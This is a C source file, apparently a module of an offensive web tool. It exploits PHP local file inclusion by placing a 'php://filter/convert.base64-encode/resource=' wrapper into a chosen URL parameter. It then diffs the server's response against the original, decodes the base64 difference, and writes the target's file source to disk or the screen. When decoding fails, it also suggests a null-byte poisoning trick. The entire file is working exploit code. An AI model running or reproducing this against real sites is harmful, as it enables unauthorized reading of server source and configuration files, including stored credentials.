#include "techniques/php-filter.h"
#include "request/request.h"
#include "string/concat.h"
#include "string/diff.h"
#include "string/utils.h"
#include "string/url.h"
#include "string/base64.h"
#include "output.h"

#include <stdlib.h>

char *phpfilter(url_t *url, const char *oldurl, const char *filename, int pnumber)
{
	request_t req1, req2;
	char *filter, *newurl, *b64 = NULL;

	request_init(&req1);
	request_init(&req2);

	filter = concatl("php://filter/convert.base64-encode/resource=", filename, NULL);
	newurl = buildurl(url, string_replace, filter, pnumber);
	free(filter);

	curl_easy_setopt(req1.ch, CURLOPT_URL, oldurl);
	curl_easy_setopt(req2.ch, CURLOPT_URL, newurl);

	if (request_exec(&req1) || request_exec(&req2))
		goto end;

	b64 = diff(req1.body.ptr, req2.body.ptr);
	if (b64)
		trim(&b64);

end:
	free(newurl);
	request_free(&req1);
	request_free(&req2);

	return b64;
}

void phpfilter_dumpfile(FILE *out, const char *target, const char *filename, const char *pname)
{
	char *b64, *decoded;
	url_t url;

	int i, pos = -1;
	size_t len;

	urlparser(&url, target);
	for (i = 0; i < url.plen; i++) {
		if (!strcmp(url.parameters[i].key, pname)) {
			pos = i;
			break;
		}
	}

	if (pos == -1) {
		xerror("parameter %s not found !!!\n", pname);
		goto end;
	}

	xinfo("trying get source code of file: %s\n", filename);

	if ((b64 = phpfilter(&url, target, filename, pos)) == NULL) {
		goto end;
	}

	if ((decoded = b64decode(b64, &len))) {
		xgood("valid base64 returned\n");

		if (out) {
			fwrite(decoded, len, 1, out);
			fclose(out);
			xgood("check the output file\n");
		} else {
			fwrite(decoded, len, 1, stdout);
		}

		printf("\n");
		free(decoded);
	} else {
		xerror("invalid base64 detected\n");
		xinfo("try use null byte poison, or set filename without extension\n");
	}

	free(b64);

end:
	urlfree(&url);
}
